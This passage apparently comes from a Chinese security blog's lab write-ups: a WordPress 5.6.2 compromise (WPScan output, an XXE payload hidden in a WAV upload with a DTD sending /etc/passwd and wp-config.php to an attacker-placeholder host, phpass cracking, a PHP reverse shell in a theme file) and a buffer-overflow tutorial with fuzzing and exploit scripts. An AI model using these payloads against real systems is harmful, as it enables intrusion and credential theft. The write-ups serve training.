class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br></pre></td><td class="code"><pre><code class="hljs less">└─# <span class="hljs-selector-tag">wpscan</span> <span class="hljs-selector-tag">--url</span> <span class="hljs-number">10.10</span><span class="hljs-selector-class">.38</span><span class="hljs-selector-class">.200</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">p</span>,<span class="hljs-selector-tag">t</span>,<span class="hljs-selector-tag">u</span><br><span class="hljs-selector-tag">_______________________________________________________________</span><br>         <span class="hljs-selector-tag">__</span>          <span class="hljs-selector-tag">_______</span>   <span class="hljs-selector-tag">_____</span><br>         \ \        / /  <span class="hljs-selector-tag">__</span> \ / <span class="hljs-selector-tag">____</span>|<br>          \ \  /\  / /| |<span class="hljs-selector-tag">__</span>) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version <span class="hljs-number">3.8</span>.<span class="hljs-number">24</span><br>       Sponsored by Automattic - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//automattic.com/</span><br>       <span class="hljs-variable">@_WPScan_</span>, <span class="hljs-variable">@ethicalhack3r</span>, <span class="hljs-variable">@erwan_lr</span>, <span class="hljs-variable">@firefart</span><br>_______________________________________________________________<br><br>[+] <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/ [10.10.38.200]</span><br>[+] <span class="hljs-attribute">Started</span>: Wed Oct <span class="hljs-number">11</span> <span class="hljs-number">16</span>:<span class="hljs-number">15</span>:<span class="hljs-number">22</span> <span class="hljs-number">2023</span><br><br>Interesting <span class="hljs-built_in">Finding</span>(s):<br><br>[+] Headers<br> | Interesting <span class="hljs-attribute">Entry</span>: <span class="hljs-attribute">Server</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">18</span> (Ubuntu)<br> | Found <span class="hljs-attribute">By</span>: Headers (Passive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">100%</span><br><br>[+] WordPress readme <span class="hljs-attribute">found</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/readme.html</span><br> | Found <span class="hljs-attribute">By</span>: Direct Access (Aggressive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">100%</span><br><br>[+] Upload directory has listing <span class="hljs-attribute">enabled</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/uploads/</span><br> | Found <span class="hljs-attribute">By</span>: Direct Access (Aggressive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">100%</span><br><br>[+] The external WP-Cron seems to be <span class="hljs-attribute">enabled</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-cron.php</span><br> | Found <span class="hljs-attribute">By</span>: Direct Access (Aggressive Detection)<br> | <span class="hljs-attribute">Confidence</span>: <span class="hljs-number">60%</span><br> | <span class="hljs-attribute">References</span>:<br> |  - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//www.iplocation.net/defend-wordpress-from-ddos</span><br> |  - <span class="hljs-attribute">https</span>:<span class="hljs-comment">//github.com/wpscanteam/wpscan/issues/1299</span><br><br>[+] WordPress version <span class="hljs-number">5.6</span>.<span class="hljs-number">2</span> identified (Insecure, released on <span class="hljs-number">2021</span>-<span class="hljs-number">02</span>-<span class="hljs-number">22</span>).<br> | Found <span class="hljs-attribute">By</span>: Rss Generator (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;</span><br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.6.2&lt;/generator&gt;</span><br><br>[+] WordPress theme in <span class="hljs-attribute">use</span>: twentytwentyone<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2023</span><span class="hljs-attribute">-03-29T00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-attribute">Readme</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/readme.txt</span><br> | [!] The version is out of date, the latest version is <span class="hljs-number">1.8</span><br> | Style <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/style.css</span><br> | Style <span class="hljs-attribute">Name</span>: Twenty Twenty-One<br> | Style <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/themes/twentytwentyone/</span><br> | <span class="hljs-attribute">Description</span>: Twenty Twenty-One is a blank canvas for your ideas <span class="hljs-keyword">and</span> it makes the block editor your best brush. Wi...<br> | <span class="hljs-attribute">Author</span>: the WordPress team<br> | Author <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Css Style In Homepage (Passive Detection)<br> | Confirmed <span class="hljs-attribute">By</span>: Urls In Homepage (Passive Detection)<br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.1</span> (<span class="hljs-number">80%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Style (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/style.css, Match: &#x27;Version: 1.1&#x27;</span><br><br>[+] Enumerating Most Popular Plugins (via Passive Methods)<br>[+] Checking Plugin Versions (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br><br>[i] <span class="hljs-built_in">Plugin</span>(s) <span class="hljs-attribute">Identified</span>:<br><br>[+] wp-security-hardening<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/plugins/wp-security-hardening/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2022</span><span class="hljs-attribute">-10-20T17</span>:<span class="hljs-number">04</span>:<span class="hljs-number">00.000</span>Z<br> | [!] The version is out of date, the latest version is <span class="hljs-number">1.2</span>.<span class="hljs-number">6</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Urls In Homepage (Passive Detection)<br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.2</span> (<span class="hljs-number">100%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Readme - Stable Tag (Aggressive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/plugins/wp-security-hardening/readme.txt</span><br> | Confirmed <span class="hljs-attribute">By</span>: Readme - ChangeLog Section (Aggressive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/plugins/wp-security-hardening/readme.txt</span><br><br>[+] Enumerating Most Popular Themes (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br> Checking Known Locations - <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">28</span> &lt;==================================&gt; (<span class="hljs-number">400</span> / <span class="hljs-number">400</span>) <span class="hljs-number">100.00%</span> <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">28</span><br>[+] Checking Theme Versions (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br><br>[i] <span class="hljs-built_in">Theme</span>(s) <span class="hljs-attribute">Identified</span>:<br><br>[+] twentynineteen<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2023</span><span class="hljs-attribute">-03-29T00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-attribute">Readme</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/readme.txt</span><br> | [!] The version is out of date, the latest version is <span class="hljs-number">2.5</span><br> | Style <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/style.css</span><br> | Style <span class="hljs-attribute">Name</span>: Twenty Nineteen<br> | Style <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/themes/twentynineteen/</span><br> | <span class="hljs-attribute">Description</span>: Our <span class="hljs-number">2019</span> default theme is designed to show off the power of the block editor. It features custom sty...<br> | <span class="hljs-attribute">Author</span>: the WordPress team<br> | Author <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Known Locations (Aggressive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/, status: 500</span><br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.9</span> (<span class="hljs-number">80%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Style (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentynineteen/style.css, Match: &#x27;Version: 1.9&#x27;</span><br><br>[+] twentytwenty<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2023</span><span class="hljs-attribute">-03-29T00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-attribute">Readme</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/readme.txt</span><br> | [!] The version is out of date, the latest version is <span class="hljs-number">2.2</span><br> | Style <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/style.css</span><br> | Style <span class="hljs-attribute">Name</span>: Twenty Twenty<br> | Style <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/themes/twentytwenty/</span><br> | <span class="hljs-attribute">Description</span>: Our default theme for <span class="hljs-number">2020</span> is designed to take full advantage of the flexibility of the block editor...<br> | <span class="hljs-attribute">Author</span>: the WordPress team<br> | Author <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Known Locations (Aggressive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/, status: 500</span><br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.6</span> (<span class="hljs-number">80%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Style (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwenty/style.css, Match: &#x27;Version: 1.6&#x27;</span><br><br>[+] twentytwentyone<br> | <span class="hljs-attribute">Location</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/</span><br> | Last <span class="hljs-attribute">Updated</span>: <span class="hljs-number">2023</span><span class="hljs-attribute">-03-29T00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.000</span>Z<br> | <span class="hljs-attribute">Readme</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/readme.txt</span><br> | [!] The version is out of date, the latest version is <span class="hljs-number">1.8</span><br> | Style <span class="hljs-attribute">URL</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/style.css</span><br> | Style <span class="hljs-attribute">Name</span>: Twenty Twenty-One<br> | Style <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/themes/twentytwentyone/</span><br> | <span class="hljs-attribute">Description</span>: Twenty Twenty-One is a blank canvas for your ideas <span class="hljs-keyword">and</span> it makes the block editor your best brush. Wi...<br> | <span class="hljs-attribute">Author</span>: the WordPress team<br> | Author <span class="hljs-attribute">URI</span>: <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wordpress.org/</span><br> |<br> | Found <span class="hljs-attribute">By</span>: Urls In Homepage (Passive Detection)<br> | Confirmed <span class="hljs-attribute">By</span>: Known Locations (Aggressive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/, status: 500</span><br> |<br> | <span class="hljs-attribute">Version</span>: <span class="hljs-number">1.1</span> (<span class="hljs-number">80%</span> confidence)<br> | Found <span class="hljs-attribute">By</span>: Style (Passive Detection)<br> |  - <span class="hljs-attribute">http</span>:<span class="hljs-comment">//10.10.38.200/wp-content/themes/twentytwentyone/style.css, Match: &#x27;Version: 1.1&#x27;</span><br><br>[+] Enumerating Users (via Passive <span class="hljs-keyword">and</span> Aggressive Methods)<br> Brute Forcing Author IDs - <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span> &lt;====================================&gt; (<span class="hljs-number">10</span> / <span class="hljs-number">10</span>) <span class="hljs-number">100.00%</span> <span class="hljs-attribute">Time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">04</span><br><br>[i] <span class="hljs-built_in">User</span>(s) <span class="hljs-attribute">Identified</span>:<br><br>[+] Corporation Test<br> | Found <span class="hljs-attribute">By</span>: Rss Generator (Passive Detection)<br><br>[!] No WPScan API Token given, as a result vulnerability data has <span class="hljs-keyword">not</span> been output.<br>[!] You can get a free API token with <span class="hljs-number">25</span> daily requests by registering at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//wpscan.com/register</span><br><br>[+] <span class="hljs-attribute">Finished</span>: Wed Oct <span class="hljs-number">11</span> <span class="hljs-number">16</span>:<span class="hljs-number">16</span>:<span class="hljs-number">14</span> <span class="hljs-number">2023</span><br>[+] Requests <span class="hljs-attribute">Done</span>: <span class="hljs-number">472</span><br>[+] Cached <span class="hljs-attribute">Requests</span>: <span class="hljs-number">18</span><br>[+] Data <span class="hljs-attribute">Sent</span>: <span class="hljs-number">123.333</span> KB<br>[+] Data <span class="hljs-attribute">Received</span>: <span class="hljs-number">631.685</span> KB<br>[+] Memory <span class="hljs-attribute">used</span>: <span class="hljs-number">247.805</span> MB<br>[+] Elapsed <span class="hljs-attribute">time</span>: <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">52</span><br></code></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>目前已知一个普通用户username和password,登录wp-login.php</p><p>所以第二步上传一个wav文件弹shell</p><p>.wav shell的制作:</p><p>把<code>RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM &#39;&quot;&#39;&quot;&#39;http://YOURSEVERIP:PORT/NAMEEVIL.dtd&#39;&quot;&#39;&quot;&#39;&gt;%remote;%init;%trick;]&gt;\x00</code>覆盖到一个正常wav文件中，否则上传会报错。</p><p>仔细看shell文本中有一个NAMEEVIL.dtd文件，是需要制作一个NAMEEVIL.dtd文件，内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">init</span> <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#x27;http://YOURSERVERIP:PORT/?p=%file;&#x27;&gt;&quot;</span> &gt;</span><br></code></pre></td></tr></table></figure><p>然后在本地起python3或者<code>php -S 0.0.0.0:端口</code>监听</p><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/ress-5-6-2/image-20231011191031118.png" alt="image-20231011191031118"></p><p>base64解码即可</p><h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>base64解出了wp-config.php文件</p><p>翻到了数据库名、数据库普通用户名密码，数据库类型mysql，登录进入mysql后找到wp user表</p><p>用户名：corp-001</p><p>密码：$P$B4fu6XVPkSU5KcKUsP1sD3Ul7G3oae1</p><p>这是一个hash</p><p>用john破解，<code>john --format:phpass mima.txt --wordlist:/usr/share/wordlists/rockyou.txt</code></p><p>获得明文密码teddybear。</p><p>用获取到的用户名密码登录wp-login.php，</p><p>由于是管理员用户，可以在左侧菜单栏中直接选择修改theme主题里面的twentytwenty&#x2F;404.php。所以可以在里面直接编辑，把里面原本的都删了，写入反弹shell。</p><p>上这个网站<a href="https://reverse.7sec.pw/">https://reverse.7sec.pw/</a>   选择里面的php pentestmonkey，复制文本然后覆盖到404.php里面。</p><p>然后本机开nc监听，访问http:&#x2F;&#x2F;$ip&#x2F;wp-content&#x2F;themes&#x2F;twentytwenty&#x2F;404.php ,弹回shell，拿到flag。Basic </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>tryhackme_buffer_overflow</title>
    <link href="/2023/09/07/tryhackme-buffer-overflow/"/>
    <url>/2023/09/07/tryhackme-buffer-overflow/</url>
    
    <content type="html"><![CDATA[<h2 id="buffer-overflow"><a href="#buffer-overflow" class="headerlink" title="buffer overflow"></a>buffer overflow</h2><p>缓冲区是用来存储数据的一块内存区域。当程序向缓冲区写入数据时，如果写入的数据超过了缓冲区的容量，就会导致缓冲区溢出。这可能会导致数据覆盖到相邻的内存区域，破坏程序的正常执行。</p><p>攻击者通过向程序输入超过缓冲区容量的数据，覆盖堆栈中的关键信息。例如，攻击者可以将恶意代码放入缓冲区溢出的数据中，并覆盖返回地址为恶意代码所在的内存地址。当函数执行完毕后，程序会跳转到恶意代码所在的地址，从而执行攻击者的恶意操作。</p><h3 id="栈溢出："><a href="#栈溢出：" class="headerlink" title="栈溢出："></a>栈溢出：</h3><p>栈溢出涉及栈中的三个<a href="https://so.csdn.net/so/search?q=%E5%AF%84%E5%AD%98%E5%99%A8&spm=1001.2101.3001.7020">寄存器</a>(32)：esp,eip,ebp–&gt;对应64位的rsp,rip,rbp</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">esp:</span>指向当前栈帧的顶部。<br><span class="hljs-symbol">ebp:</span>指向当前栈帧的底部。<br><span class="hljs-symbol">eip:</span>指向当前栈帧中执行的指令（可以理解为读取esp地址中所对应的信息）<br></code></pre></td></tr></table></figure><p>可以理解为esp是location  eip是information</p><h3 id="Immunity-Debugger"><a href="#Immunity-Debugger" class="headerlink" title="Immunity Debugger"></a>Immunity Debugger</h3><p>exp开发软件 python写的</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ada">左上角是CPU窗口<span class="hljs-comment">------显示了正在处理的代码的反汇编指令。</span><br>右上角是寄存器窗口<span class="hljs-comment">------显示所有通用寄存器。</span><br>左下角是内存窗口<span class="hljs-comment">---------以十六进制的形式显示任何被选中的内存块。</span><br>右下角是堆栈窗口<span class="hljs-comment">---------显示调用的堆栈和解码后的函数参数（任何原生的API调用）。</span><br>最底下白色的窗口是命令栏<span class="hljs-comment">-----能够像windbg一样使用命令控制调试器，或者执行PyCommands命令。</span><br></code></pre></td></tr></table></figure><h3 id="Mona"><a href="#Mona" class="headerlink" title="Mona"></a><strong>Mona</strong></h3><p>Immunnity Debugger的插件</p><p>命令</p><p>用以下命令配置一个工作文件夹</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-title">!mona</span> config -set workingfolder <span class="hljs-keyword">c</span>:\mona\<span class="hljs-variable">%p</span><br>//<span class="hljs-variable">%p</span>代表进程的名称<br></code></pre></td></tr></table></figure><h3 id="fuzzing测试"><a href="#fuzzing测试" class="headerlink" title="fuzzing测试"></a>fuzzing测试</h3><p>找到大概多少字节会导致缓冲区溢出使目标程序崩溃</p><p>也就是找到目标应用程序崩溃时 EIP 寄存器偏移的一般范围。</p><p>下面的脚本内容并非通用，实际环境下的fuzz脚本可能会涉及username、pass等参数。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br>import <span class="hljs-built_in">socket</span>, <span class="hljs-built_in">time</span>, sys<br><br>ip = <span class="hljs-string">&quot;MACHINE_IP&quot;</span><br><br>port = 端口<br>timeout = <span class="hljs-number">5</span><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br><br><span class="hljs-keyword">string</span> = prefix + <span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">100</span><br><br><span class="hljs-keyword">while</span> True:<br>  <span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">socket</span>.<span class="hljs-built_in">socket</span>(<span class="hljs-built_in">socket</span>.AF_INET, <span class="hljs-built_in">socket</span>.SOCK_STREAM) <span class="hljs-keyword">as</span> s:<br>      s.settimeout(timeout)<br>      s.connect((ip, port))<br>      s.recv(<span class="hljs-number">1024</span>)<br>      print(<span class="hljs-string">&quot;Fuzzing with &#123;&#125; bytes&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">string</span>) - <span class="hljs-built_in">len</span>(prefix)))<br>      s.<span class="hljs-built_in">send</span>(<span class="hljs-keyword">bytes</span>(<span class="hljs-keyword">string</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>      s.recv(<span class="hljs-number">1024</span>)<br>  except:<br>    print(<span class="hljs-string">&quot;Fuzzing crashed at &#123;&#125; bytes&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-keyword">string</span>) - <span class="hljs-built_in">len</span>(prefix)))<br>    sys.exit(<span class="hljs-number">0</span>)<br>  <span class="hljs-keyword">string</span> += <span class="hljs-number">100</span> * <span class="hljs-string">&quot;A&quot;</span><br>  <span class="hljs-built_in">time</span>.sleep(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="EIP"><a href="#EIP" class="headerlink" title="EIP"></a>EIP</h3><p>fuzzing发送之后检查当前Immunity Debugger中的EIP是否被A的ASCII码\x41覆盖</p><h3 id="崩溃复制和控制-EIP"><a href="#崩溃复制和控制-EIP" class="headerlink" title="崩溃复制和控制 EIP"></a><strong>崩溃复制和控制 EIP</strong></h3><p>为了控制应用程序的流程，我们有必要控制EIP寄存器，因为它指向下一条指令，为此必须知道确切的偏移量。</p><p>要找到目标程序崩溃时EIP寄存器确切的EIP偏移量。</p><p>exploit.py</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs makefile">import socket<br><br>ip = <span class="hljs-string">&quot;MACHINE_IP&quot;</span><br>port = 1337<br><br>prefix = <span class="hljs-string">&quot;OVERFLOW1 &quot;</span><br>offset = 0<br>overflow = <span class="hljs-string">&quot;A&quot;</span> * offset<br>retn = <span class="hljs-string">&quot;&quot;</span><br>padding = <span class="hljs-string">&quot;&quot;</span><br>payload = <span class="hljs-string">&quot;&quot;</span><br>postfix = <span class="hljs-string">&quot;&quot;</span><br><br>buffer = prefix + overflow + retn + padding + payload + postfix<br><br>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br><br><span class="hljs-section">try:</span><br>  s.connect((ip, port))<br>  //s.recv(1024)   脚本要根据实际情况变形，比如说程序的第二个输入才有缓冲区溢出时，应该先revc,然后send一条无关紧要的，然后再revc（1024） ，然后在send出真正的payload<br>  print(<span class="hljs-string">&quot;Sending evil buffer...&quot;</span>)<br>  s.send(bytes(buffer + <span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;latin-1&quot;</span>))<br>  print(<span class="hljs-string">&quot;Done!&quot;</span>)<br><span class="hljs-section">except:</span><br>  print(<span class="hljs-string">&quot;Could not connect.&quot;</span>)<br></code></pre></td></tr></table></figure><p>offset暂时设置为0</p><p>生成payload</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_create.rb -l <span class="hljs-variable">$num_fuzzing</span>+<span class="hljs-number">400</span><br></code></pre></td></tr></table></figure><p>重启oscp.exe</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">每次于攻击机中运行 exploit.<span class="hljs-keyword">py</span>脚本（我们将多次运行该脚本并进行增量修改）之前，我们都必须执行restart操作（在虚拟靶机中使用Immunity Debugger重新打开oscp.<span class="hljs-keyword">exe</span>文件）。<br></code></pre></td></tr></table></figure><p>发送payload</p><p>查看Immunity Debugger右下角程序的状态是否由running变为pause</p><p>exploit.py脚本应该会再次使 oscp.exe 相关的服务器崩溃</p><p>然后将distance 更改为与刚才所创建的模式相同的长度值</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">!mona findmsp -<span class="hljs-built_in">distance</span> $num_fuzzing+<span class="hljs-number">400</span><br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/tenda-ac15-%E6%A0%88%E6%BA%A2%E5%87%BA/r-overflow/image-20231028012207899.png" alt="image-20231028012207899"></p><p><strong>distance</strong></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">distance </span>的值将表示我们将从哪个位置开始查找寄存器<br>使用能够导致崩溃的缓冲区长度并生成一个唯一的缓冲区，这样我们就可以确定覆盖 <span class="hljs-keyword">EIP </span>寄存器的模式中的确切偏移量，以及其他寄存器指向的模式中的偏移量。<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-type">!mona</span> <span class="hljs-string">findmsp</span> <span class="hljs-string">-distance</span> <span class="hljs-number">2400</span><br></code></pre></td></tr></table></figure><p>使用随机数据一路填充到”EIP offset”，然后我们就可以控制EIP</p><h3 id="验证EIP偏移量"><a href="#验证EIP偏移量" class="headerlink" title="验证EIP偏移量"></a>验证EIP偏移量</h3><p>获得EIP寄存器中的偏移量填入到exploit.py中offset</p><p>“retn ” 变量值设置为“BBBB”</p><p>payload清空</p><p>重启oscp.exe</p><p>发送payload</p><p>此时EIP寄存器应该已被BBBB覆盖（ASCII值为42424242）</p><h3 id="寻找坏字符"><a href="#寻找坏字符" class="headerlink" 